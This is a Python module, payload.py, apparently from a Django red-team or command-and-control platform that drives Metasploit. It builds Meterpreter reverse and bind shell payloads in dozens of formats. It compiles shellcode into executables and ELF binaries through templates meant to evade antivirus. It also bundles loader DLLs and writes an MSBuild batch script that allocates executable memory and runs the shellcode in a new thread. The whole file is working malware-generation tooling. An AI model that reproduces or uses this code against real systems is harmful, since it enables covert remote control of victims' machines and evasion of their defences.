# -*- coding: utf-8 -*-
# @File  : payload.py
# @Date  : 2021/2/25
# @Desc  :
import base64
import os
import time
import zipfile
from urllib import parse

from django.conf import settings
from django.http import HttpResponse
from jinja2 import Environment, FileSystemLoader

from Lib.api import data_return
from Lib.configs import Payload_MSG_ZH, PAYLOAD_LOADER_STORE_PATH, RPC_FRAMEWORK_API_REQ, Payload_MSG_EN
from Lib.file import File
from Lib.gcc import Gcc, GCC_INCULDE_DIR, GCC_CODE_TEMPLATE_DIR
from Lib.mingw import MINGW_CODE_TEMPLATE_DIR, Mingw, MINGW_INCULDE_DIR
from Lib.msfmodule import MSFModule
from Lib.notice import Notice


class Payload(object):
    def __init__(self):
        # 生成所需参数
        self.path = None  # payload路径 windows/x64/meterpreter/reverse_tcp
        self.lhost = None  # LHOST
        self.lport = None  # LPORT
        self.rhost = None  # RHOST
        self.rport = None  # RPORT
        self.format = None  # exe psh-reflection elf
        # 存储所需参数
        self.link = None  # 文件链接地址

    @staticmethod
    def create(mname=None, opts=None):
        """生成payload文件"""

        # badchars = opts['BadChars'] | | ''
        # fmt = opts['Format'] | | 'raw'
        # force = opts['ForceEncode'] | | false
        # template = opts['Template'] | | nil
        # plat = opts['Platform'] | | nil
        # keep = opts['KeepTemplateWorking'] | | false
        # force = opts['ForceEncode'] | | false
        # sled_size = opts['NopSledSize'].to_i | | 0
        # iter = opts['Iterations'].to_i | | 0

        # 清理历史文件
        Payload._destroy_old_files()

        # 处理RHOST及LHOST参数
        if mname.find("reverse") > 0:
            if mname.find("reverse_dns") > 0:
                try:
                    opts.pop('LHOST')
                except Exception as _:
                    pass
            else:
                try:
                    opts.pop('RHOST')
                except Exception as _:
                    pass
        elif mname.find("bind") > 0:
            try:
                opts.pop('LHOST')
            except Exception as _:
                pass

        # 处理OverrideRequestHost参数
        if opts.get('OverrideRequestHost') is True:
            opts["LHOST"] = opts['OverrideLHOST']
            opts["LPORT"] = opts['OverrideLPORT']
            opts['OverrideRequestHost'] = False
            Notice.send_warning("Payload包含OverrideRequestHost参数", "Payload contains the OverrideRequestHost parameter")
            Notice.send_warning(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}",
                                f"Replace LHOST with OverrideLHOST:{opts['OverrideLHOST']}")
            Notice.send_warning(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}",
                                f"Replace LPORT with OverrideLPORT:{opts['OverrideLPORT']}")

        # EXTENSIONS参数
        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
            opts['EXTENSIONS'] = 'stdapi'

        if opts.get("Format") == "AUTO":
            if "windows" in mname:
                opts["Format"] = 'exe-src'
            elif "linux" in mname:
                opts["Format"] = 'elf-src'
            elif "java" in mname:
                opts["Format"] = 'jar'
            elif "python" in mname:
                opts["Format"] = 'py-diy'
            elif "php" in mname:
                opts["Format"] = 'raw'
            elif "android" in mname:
                opts["Format"] = 'raw'
            elif "osx" in mname:
                opts["Format"] = 'macho'
            else:
                context = data_return(306, {}, Payload_MSG_ZH.get(306), Payload_MSG_EN.get(306))
                return context

        if opts.get("Format") in ["exe-diy", "dll-diy", "dll-mutex-diy", "elf-diy"]:
            # 生成原始payload
            tmp_type = opts.get("Format")
            opts["Format"] = "hex"
            result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                       timeout=RPC_FRAMEWORK_API_REQ)
            if result is None:
                context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                return context

            byteresult = base64.b64decode(result.get('payload'))
            filename = Payload._create_payload_with_loader(mname, byteresult, payload_type=tmp_type)
            # 读取新的zip文件内容
            payloadfile = os.path.join(File.tmp_dir(), filename)
            if opts.get("HandlerName") is not None:
                filename = f"{opts.get('HandlerName')}_{filename}"
            byteresult = open(payloadfile, 'rb')
        elif opts.get("Format") == "msbuild":
            # 生成原始payload
            opts["Format"] = "csharp"
            result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                       timeout=RPC_FRAMEWORK_API_REQ)
            if result is None:
                context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                return context
            byteresult = base64.b64decode(result.get('payload'))
            filename = Payload._create_payload_use_msbuild(mname, byteresult)
            # 读取新的zip文件内容
            payloadfile = os.path.join(File.tmp_dir(), filename)
            byteresult = open(payloadfile, 'rb')
        elif opts.get("Format") == "exe-src":
            if mname in ['windows/meterpreter_bind_tcp',
                         'windows/meterpreter_reverse_tcp',
                         'windows/meterpreter_reverse_http',
                         'windows/meterpreter_reverse_https',
                         'windows/meterpreter_reverse_dns',
                         'windows/x64/meterpreter_bind_tcp',
                         'windows/x64/meterpreter_reverse_tcp',
                         'windows/x64/meterpreter_reverse_http',
                         'windows/x64/meterpreter_reverse_https',
                         'windows/x64/meterpreter_reverse_dns']:
                opts["Format"] = "exe"
                result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                           timeout=RPC_FRAMEWORK_API_REQ)
                if result is None:
                    context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                    return context
                byteresult = base64.b64decode(result.get('payload'))
                filename = f"{int(time.time())}.exe"
            else:
                opts["Format"] = "hex"
                result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                           timeout=RPC_FRAMEWORK_API_REQ)
                if result is None:
                    context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                    return context
                byteresult = base64.b64decode(result.get('payload'))
                byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
                                                              template="REVERSE_HEX_BASE")
                filename = f"{int(time.time())}.exe"
        elif opts.get("Format") == "exe-src-service":
            opts["Format"] = "hex"
            result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                       timeout=RPC_FRAMEWORK_API_REQ)
            if result is None:
                context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                return context
            byteresult = base64.b64decode(result.get('payload'))  # result为None会抛异常
            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
                                                          template="REVERSE_HEX_AS_SERVICE")
            filename = f"{int(time.time())}.exe"
        # linux类型免杀
        elif opts.get("Format") == "elf-src":
            if mname in ['linux/x86/meterpreter/reverse_tcp', 'linux/x86/meterpreter/bind_tcp',
                         'linux/x64/meterpreter/reverse_tcp', 'linux/x64/meterpreter/bind_tcp', ]:
                opts["Format"] = "hex"
                result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                           timeout=RPC_FRAMEWORK_API_REQ)
                if result is None:
                    context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                    return context
                byteresult = base64.b64decode(result.get('payload'))
                byteresult = Payload._create_payload_by_gcc(mname=mname, shellcode=byteresult)
                filename = f"{int(time.time())}.elf"
            else:
                opts["Format"] = "elf"
                result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                           timeout=RPC_FRAMEWORK_API_REQ)
                if result is None:
                    context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                    return context
                byteresult = base64.b64decode(result.get('payload'))
                filename = f"{int(time.time())}.elf"
        elif opts.get("Format") == "py-diy":
            opts["Format"] = "raw"
            result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                       timeout=RPC_FRAMEWORK_API_REQ)
            if result is None:
                context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                return context
            byteresult = base64.b64decode(result.get('payload'))
            byteresult = f"python -c \"{byteresult.decode('utf-8')}\""
            filename = f"{int(time.time())}.txt"

        else:
            file_suffix = {
                "asp": "asp",
                "aspx": "aspx",
                "aspx-exe": "aspx",
                'base32': "base32",
                'base64': "base64",
                'bash': "sh",
                'c': "c",
                'csharp': "cs",
                "dll": "dll",
                'dword': "dword",
                "elf": "elf",
                "elf-so": "so",
                "exe": "exe",
                "exe-only": "exe",
                "exe-service": "exe",
                "exe-small": "exe",
                'hex': "hex",
                "hta-psh": "hta",
                "jar": "jar",
                'java': "java",
                "jsp": "jsp",
                'js_be': "js",
                'js_le': "js",
                "macho": "macho",
                "msi": "msi",
                "msi-nouac": "msi",
                'powershell': "ps1",
                "psh": "ps1",
                "psh-cmd": "psh-cmd",
                "psh-net": "psh-net",
                "psh-reflection": "psh-reflection",
                'python': "py",
                "python-reflection": "python-reflection",
                'perl': "pl",
                'raw': "raw",
                'ruby': "rb",
                'vbapplication': "vba",
                "vba": "vba",
                "vba-exe": "vba",
                "vba-psh": "vba",
                "vbs": "vbs",
                'vbscript': "vbscript",
                "loop-vbs": "vbs",
                "war": "war",
            }
            result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                       timeout=RPC_FRAMEWORK_API_REQ)
            if result is None:
                context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
                return context
            byteresult = base64.b64decode(result.get('payload'))
            if "android" in mname:
                filename = f"{int(time.time())}.apk"
            elif file_suffix.get(opts.get("Format")) is None:
                filename = f"{int(time.time())}"
            else:
                filename = f"{int(time.time())}.{file_suffix.get(opts.get('Format'))}"

        response = HttpResponse(byteresult)
        response['Content-Type'] = 'application/octet-stream'
        response['Code'] = 200
        response['Msg_zh'] = parse.quote(Payload_MSG_ZH.get(201))
        response['Msg_en'] = parse.quote(Payload_MSG_EN.get(201))
        # 中文特殊处理
        urlpart = parse.quote(os.path.splitext(filename)[0], 'utf-8')
        leftpart = os.path.splitext(filename)[-1]
        response['Content-Disposition'] = f"{urlpart}{leftpart}"
        return response

    @staticmethod
    def generate_payload(mname=None, opts=None):
        """根据配置生成shellcode"""
        # 处理RHOST及LHOST参数
        if mname.find("reverse") > 0:
            try:
                opts.pop('RHOST')
            except Exception as _:
                pass
        elif mname.find("bind") > 0:
            try:
                opts.pop('LHOST')
            except Exception as _:
                pass

        # 处理OverrideRequestHost参数
        if opts.get('OverrideRequestHost') is True:
            opts["LHOST"] = opts['OverrideLHOST']
            opts["LPORT"] = opts['OverrideLPORT']
            opts['OverrideRequestHost'] = False
            Notice.send_warning("Payload包含OverrideRequestHost参数", "Payload contains the OverrideRequestHost parameter")
            Notice.send_warning(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}",
                                f"Replace LHOST with OverrideLHOST:{opts['OverrideLHOST']}")
            Notice.send_warning(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}",
                                f"Replace LPORT with OverrideLPORT:{opts['OverrideLPORT']}")

        # EXTENSIONS参数
        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
            opts['EXTENSIONS'] = 'stdapi'

        result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                   timeout=RPC_FRAMEWORK_API_REQ)
        if result is None:
            return result
        byteresult = base64.b64decode(result.get('payload'))
        return byteresult

    @staticmethod
    def generate_shellcode(mname=None, opts=None):
        """根据配置生成shellcode"""
        # 处理RHOST及LHOST参数
        if mname.find("reverse") > 0:
            try:
                opts.pop('RHOST')
            except Exception as _:
                pass
        elif mname.find("bind") > 0:
            try:
                opts.pop('LHOST')
            except Exception as _:
                pass

        # 处理OverrideRequestHost参数
        if opts.get('OverrideRequestHost') is True:
            opts["LHOST"] = opts['OverrideLHOST']
            opts["LPORT"] = opts['OverrideLPORT']
            opts['OverrideRequestHost'] = False
            Notice.send_warning("Payload包含OverrideRequestHost参数", "Payload contains the OverrideRequestHost parameter")
            Notice.send_warning(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}",
                                f"Replace LHOST with OverrideLHOST:{opts['OverrideLHOST']}")
            Notice.send_warning(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}",
                                f"Replace LPORT with OverrideLPORT:{opts['OverrideLPORT']}")

        # EXTENSIONS参数
        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
            opts['EXTENSIONS'] = 'stdapi'

        opts["Format"] = 'raw'
        if "windows" in mname:
            opts["Format"] = 'raw'
        elif "linux" in mname:
            opts["Format"] = 'raw'
        elif "java" in mname:
            opts["Format"] = 'jar'
        elif "python" in mname:
            opts["Format"] = 'py'
        elif "php" in mname:
            opts["Format"] = 'raw'

        result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                   timeout=RPC_FRAMEWORK_API_REQ)
        if result is None:
            return result
        byteresult = base64.b64decode(result.get('payload'))
        return byteresult

    @staticmethod
    def generate_bypass_exe(mname=None, opts=None, template="REVERSE_HEX_BASE"):
        """生成免杀的exe,随版本不断更新"""
        # 处理RHOST及LHOST参数
        if mname.find("reverse") > 0:
            try:
                opts.pop('RHOST')
            except Exception as _:
                pass
        elif mname.find("bind") > 0:
            try:
                opts.pop('LHOST')
            except Exception as _:
                pass

        # 处理OverrideRequestHost参数
        if opts.get('OverrideRequestHost') is True:
            opts["LHOST"] = opts['OverrideLHOST']
            opts["LPORT"] = opts['OverrideLPORT']
            opts['OverrideRequestHost'] = False
            Notice.send_warning("Payload包含OverrideRequestHost参数", "Payload contains the OverrideRequestHost parameter")
            Notice.send_warning(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}",
                                f"Replace LHOST with OverrideLHOST:{opts['OverrideLHOST']}")
            Notice.send_warning(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}",
                                f"Replace LPORT with OverrideLPORT:{opts['OverrideLPORT']}")

        # EXTENSIONS参数
        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
            opts['EXTENSIONS'] = 'stdapi'

        opts["Format"] = "hex"
        result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                   timeout=RPC_FRAMEWORK_API_REQ)
        if result is None:
            return None
        shellcode = base64.b64decode(result.get('payload'))

        byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=shellcode,
                                                      template=template)
        return byteresult

    @staticmethod
    def _create_payload_by_mingw(mname, shellcode, template):

        if mname.startswith('windows/x64'):
            arch = 'x64'
        elif mname.startswith('windows/meterpreter'):
            arch = 'x86'
        else:
            raise Exception('unspport mname')

        env = Environment(loader=FileSystemLoader(MINGW_CODE_TEMPLATE_DIR))

        if template in ["REVERSE_HEX", "REVERSE_HEX_AS_SERVICE"]:
            tpl = env.get_template(f'{template}.c')
            reverse_hex_str = bytes.decode(shellcode)[::-1]
            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
            mingwx64 = Mingw(MINGW_INCULDE_DIR, src)
            byteresult = mingwx64.compile_c(arch=arch)
        elif template in ["REVERSE_HEX_BASE", "REVERSE_HEX_GUARD", "REVERSE_HEX_MUTEX"]:
            tpl = env.get_template(f'{template}.cpp')
            reverse_hex_str = bytes.decode(shellcode)[::-1]
            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
            mingwx64 = Mingw(None, src)
            byteresult = mingwx64.compile_cpp(arch=arch)
        elif template in ["HEX_REVERSE_BASE64"]:
            tpl = env.get_template(f'{template}.cpp')
            hex_reverse_str = bytes.decode(shellcode)[::-1]
            hex_reverse_base64_str = base64.b64encode(hex_reverse_str.encode()).decode()[::-1]
            src = tpl.render(SHELLCODE_STR=hex_reverse_base64_str)
            mingwx64 = Mingw(None, src)
            byteresult = mingwx64.compile_cpp(arch=arch)
        else:
            raise Exception('unspport template')

        return byteresult

    @staticmethod
    def _create_payload_by_gcc(mname=None, shellcode=None, payload_type="REVERSE_HEX"):
        if payload_type == "REVERSE_HEX":
            env = Environment(loader=FileSystemLoader(GCC_CODE_TEMPLATE_DIR))
            tpl = env.get_template('REVERSE_HEX.c')
            reverse_hex_str = bytes.decode(shellcode)[::-1]
            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
        else:
            raise Exception('unspport type')
        if mname.startswith('linux/x64'):
            arch = 'x64'
        elif mname.startswith('linux/x86'):
            arch = 'x86'
        else:
            raise Exception('unspport mname')
        gcc = Gcc(GCC_INCULDE_DIR, src)
        byteresult = gcc.compile_c(arch=arch)
        return byteresult

    @staticmethod
    def _create_payload_with_loader(mname=None, result=None, payload_type="exe-diy"):
        filename = f"{int(time.time())}.zip"

        payloadfile = os.path.join(File.tmp_dir(), filename)
        extraloader_filepath = None
        extra_arcname = None
        if payload_type == "exe-diy":
            arcname = "loader.exe"
            shellcode_filename = "loader.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'loader_x64.exe'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'loader_x86.exe'
            else:
                raise Exception('unspport mname')
        elif payload_type == "dll-diy":
            arcname = "loaderdll.dll"
            shellcode_filename = "loaderdll.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'DirectDLL_x64.dll'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'DirectDLL_x86.dll'
            else:
                raise Exception('unspport mname')
        elif payload_type == "dll-mutex-diy":
            arcname = "loaderdllmutex.dll"
            shellcode_filename = "loaderdllmutex.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'MDSDLL_x64.dll'
                extraloader = 'loader_x64.exe'
                extraloader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
                extra_arcname = "loaderdllmutex.exe"
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'MDSDLL_x86.dll'
                extraloader = 'loader_x86.exe'
                extraloader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
                extra_arcname = "loaderdllmutex.exe"
            else:
                raise Exception('unspport mname')
        elif payload_type == "elf-diy":
            arcname = "loader"
            shellcode_filename = "shellcode"
            if mname.startswith('linux/x64'):
                loaderfile = 'unix_sc'
            elif mname.startswith('linux/x86'):
                loaderfile = 'unix_sc_x86'
            else:
                raise Exception('unspport mname')
        else:
            arcname = "loader.exe"
            shellcode_filename = "loader.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'loader_x64.exe'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'loader_x86.exe'
            else:
                raise Exception('unspport mname')

        loader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, loaderfile)
        new_zip = zipfile.ZipFile(payloadfile, 'w')
        new_zip.writestr(shellcode_filename, data=result, compress_type=zipfile.ZIP_DEFLATED)
        new_zip.write(loader_filepath, arcname=arcname, compress_type=zipfile.ZIP_DEFLATED)
        if payload_type == "dll-mutex-diy":
            new_zip.write(extraloader_filepath, arcname=extra_arcname, compress_type=zipfile.ZIP_DEFLATED)
        new_zip.close()
        return filename

    @staticmethod
    def _create_payload_use_msbuild(mname=None, shellcode=None):
        filename = f"{int(time.time())}.zip"
        if isinstance(shellcode, bytes):
            shellcode = shellcode.decode(encoding="utf-8").replace("\n", '')

        if mname.startswith('windows/x64'):
            msbuilddllpath = """C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"""
        elif mname.startswith('windows/meterpreter'):
            msbuilddllpath = """C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"""
        else:
            raise Exception('unspport mname')
        filedata = f"""
echo ^<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^>>>a.xml
echo  ^<Target Name="Hello"^>>>a.xml
echo    ^<ClassExample /^>>>a.xml
echo  ^</Target^>>>a.xml
echo  ^<UsingTask>>a.xml
echo    TaskName="ClassExample">>a.xml
echo    TaskFactory="CodeTaskFactory">>a.xml
echo    AssemblyFile="{msbuilddllpath}" ^>>>a.xml
echo    ^<Task^>>>a.xml
echo      ^<Code Type="Class" Language="cs"^>>>a.xml
echo      ^<![CDATA[>>a.xml
echo        using System;>>a.xml
echo        using System.Runtime.InteropServices;>>a.xml
echo        using Microsoft.Build.Framework;>>a.xml
echo        using Microsoft.Build.Utilities;>>a.xml
echo        public class ClassExample :  Task, ITask>>a.xml
echo        {{         >>a.xml
echo          private static UInt32 MEM_COMMIT = 0x1000;          >>a.xml
echo          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          >>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,>>a.xml
echo            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          >>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern IntPtr CreateThread(            >>a.xml
echo            UInt32 lpThreadAttributes,>>a.xml
echo            UInt32 dwStackSize,>>a.xml
echo            UInt32 lpStartAddress,>>a.xml
echo            IntPtr param,>>a.xml
echo            UInt32 dwCreationFlags,>>a.xml
echo            ref UInt32 lpThreadId           >>a.xml
echo            );>>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern UInt32 WaitForSingleObject(           >>a.xml
echo            IntPtr hHandle,>>a.xml
echo            UInt32 dwMilliseconds>>a.xml
echo            );          >>a.xml
echo          public override bool Execute()>>a.xml
echo          {{>>a.xml
echo            {shellcode}>>a.xml
echo              UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,>>a.xml
echo                MEM_COMMIT, PAGE_EXECUTE_READWRITE);>>a.xml
echo              Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);>>a.xml
echo              IntPtr hThread = IntPtr.Zero;>>a.xml
echo              UInt32 threadId = 0;>>a.xml
echo              IntPtr pinfo = IntPtr.Zero;>>a.xml
echo              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);>>a.xml
echo              WaitForSingleObject(hThread, 0xFFFFFFFF);>>a.xml
echo              return true;>>a.xml
echo          }} >>a.xml
echo        }}     >>a.xml
echo      ]]^>>>a.xml
echo      ^</Code^>>>a.xml
echo    ^</Task^>>>a.xml
echo  ^</UsingTask^>>>a.xml
echo ^</Project^>>>a.xml"""

        payloadfile = os.path.join(File.tmp_dir(), filename)

        new_zip = zipfile.ZipFile(payloadfile, 'w')
        new_zip.writestr("cmd.bat", data=filedata, compress_type=zipfile.ZIP_DEFLATED)
        readmefilepath = os.path.join(settings.BASE_DIR, "STATICFILES", "STATIC", "msbuild.md")
        new_zip.write(readmefilepath, arcname="readme.md", compress_type=zipfile.ZIP_DEFLATED)
        new_zip.close()
        return filename

    @staticmethod
    def _destroy_old_files():
        for file in os.listdir(File.tmp_dir()):
            file_path = os.path.join(File.tmp_dir(), file)
            if os.path.isdir(file_path):
                continue
            else:
                timestamp = time.time()
                file_timestamp = os.path.getctime(file_path)
                if timestamp - file_timestamp > 3600 * 24:
                    os.remove(file_path)
